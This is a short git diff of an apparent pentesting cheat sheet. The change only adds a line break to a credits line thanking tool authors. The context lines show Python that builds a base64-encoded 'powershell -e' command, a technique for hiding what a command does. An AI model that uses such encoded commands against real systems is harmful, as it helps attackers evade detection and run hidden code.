@@ -1998,7 +1998,7 @@ cmdline = "powershell -e " + base64.b64encode(payload.encode('utf16')[2:]).decod
 print(cmdline)
 ```
 
-Special Thanks to Creator of tools and Community
+Special Thanks to Creator of tools and Community </br>
 <a href="#">Nikhil Mittal</a>
 <a href="https://github.com/saisathvik1">Sai Sathvik Ruppa</a>
 ---
